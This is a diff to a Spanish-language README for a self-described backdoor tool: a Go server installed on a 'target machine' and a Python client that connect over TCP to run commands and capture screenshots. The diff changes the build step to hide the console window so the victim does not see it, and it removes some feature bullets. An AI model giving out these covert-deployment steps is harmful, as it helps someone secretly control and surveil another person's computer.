@@ -55,10 +55,8 @@ Ambos componentes se comunican a través de TCP, permitiendo ejecutar comandos, 
 - Reconexión automática
 
 ### 🚀 Mejoras en V2.0 (Go)
-- **Ejecución oculta**: Ventanas de comandos no visibles para el usuario
 - **Gestión avanzada de imágenes**: Transferencia eficiente de capturas de pantalla
 - **Timeouts inteligentes**: Evita bloqueos con cancelación contextual
-- **Interfaz mejorada**: Colores y formato para mejor experiencia
 
 
 ## Instalación y Uso
@@ -91,7 +89,7 @@ python cliente.py --ip 192.168.1.20 --puerto 999
 1. **En el equipo objetivo (Backdoor):**
 ```bash
 cd server
-go build -o backdoor.exe
+go build -ldflags "-H=windowsgui" # evita que se muestre la consola
 .\backdoor.exe
 ```
 
